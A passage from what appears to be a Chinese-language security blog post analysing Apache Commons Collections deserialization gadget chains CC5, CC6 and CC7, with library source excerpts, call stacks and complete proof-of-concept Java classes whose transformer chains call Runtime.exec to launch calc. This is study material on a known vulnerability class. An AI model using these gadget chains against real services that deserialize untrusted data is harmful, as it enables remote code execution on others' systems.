class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">...</span><br><span class="line">main:41, CommonsCollections5 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"><a href="#CommonsCollections6（HashMap→TiedMapEntry→LazyMap）" class="headerlink" title="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"></a>CommonsCollections6（HashMap→TiedMapEntry→LazyMap）</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的 <code>hashCode</code> 方法会调用到内部成员 <code>map</code> 的 <code>get</code> 方法，如果 <code>map</code> 被 <code>LazyMap</code> 修饰过就可以调用到 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>java.util.HashMap#readObject</code> 方法会对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(triggerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">...</span><br><span class="line">main:34, CommonsCollections6 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 <code>HashMap</code> 的 <code>put</code> 方法同样对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此在 poc 中当我们 <code>triggerMap.put(entry, &quot;123&quot;)</code> 时会调用 <code>TiedMapEntry.hashCode</code> 从而调用 <code>LazyMap.get</code>，使得 <code>TiedMapEntry.key</code> 已经放到 <code>TiedMapEntry.map</code> 中了，因此会导致后续反序列化无法虽然调用到 <code>LazyMap.get</code>，但是调用不到 <code>transform</code> 方法。解决方法是调用 <code>LazyMap.clear</code> 清空 <code>LazyMap</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections7（Hashtable→LazyMap）"><a href="#CommonsCollections7（Hashtable→LazyMap）" class="headerlink" title="CommonsCollections7（Hashtable→LazyMap）"></a>CommonsCollections7（Hashtable→LazyMap）</h3><p><code>Hashtable</code> 的 <code>readObject</code> 调用 <code>reconstitutionPut</code> 函数将反序列化出的键值对存储到哈希表 <code>table</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>reconstitutionPut</code> 函数先对传入的 <code>key</code> 调用 <code>hashCode</code> 方法得到哈希值，然后计算出哈希值对应哈希表的下标 <code>index</code>。在哈希表 <code>tab</code> 中遍历 <code>index</code> 对应的那一项中的每一个元素 <code>e</code>，然后判断该元素的哈希值与当前要添加的那一项的哈希值是否相等。如果哈希值相等则调用 <code>e.key.equals</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// 如果哈希值相等则对哈希表中的 key 调用 equals 方法。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 <code>HashMap</code> 和 <code>LazyMap</code> 有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/java-serialization/images/image-20241108030406773.png"
                      alt="image-20241108030406773"
                ><br>可以看到，<code>HashMap</code> 继承于 <code>AbstraceMap</code>，<code>LazyMap</code> 继承于 <code>AbstractMapDecorator</code>。</p>
<p>因此如果 <code>HashTable</code> 中的 <code>key</code> 都是 <code>LazyMap</code> 修饰的 <code>HashMap</code> 那么 <code>e.key.equals</code> 最终会调用 <code>LazyMap#get</code> 进而触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// 确保不是同一个 LazyMap 对象</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">       <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">           <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">               Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">               <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key))) <span class="comment">// 调用 LazyMap#get</span></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.equals(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
<p>根据前面的分析可知我们可以在 <code>Hashtable</code> 放两个键值对满足两个键哈希值相同但不是同一个的 <code>LazyMap</code> 对像。而 <code>LazyMap</code> 的哈希值实际上就是 <code>Map</code> 中所有「键和值的哈希的异或值」之和。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstraceMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">            h += i.next().hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstractMapDecorator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>
<p>我们不妨让键值对中的值相等，那么就只需要考虑找哈希相等且值不同的键。</p>
<p>我们选择 <code>java.lang.String</code> 类型的键，这个类型的 <code>hashCode</code> 实现如下，我们很容易就想到可以构造长度为 2 的字符串，然后通过前一个字符的 ascii 码加 1 然后后一个字符的 ascii 码减 31 抵消前一个字符的影响来得到两个哈希相同的字符串（例如 <code>Aa</code>→<code>[65,97]</code>→<code>[65+1,97-31]</code>→<code>[66,66]</code>→<code>BB</code>）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span 